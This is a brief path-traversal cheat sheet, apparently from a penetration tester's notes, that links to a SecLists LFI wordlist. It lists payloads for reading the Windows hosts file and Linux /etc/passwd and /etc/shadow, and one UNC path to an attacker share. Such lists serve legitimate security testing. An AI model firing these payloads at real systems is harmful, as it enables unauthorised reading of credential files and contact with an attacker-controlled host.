#path_traversal 

## Windows
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```
C:/WINDOWS/System32/drivers/etc/hosts
```

```
\\[ATTACKER_IP]\myShare\maliciousFile
```

## Linux 
```
../../../../../../etc/passwd
```

```
/etc/passwd
```

```
/etc/shadow
```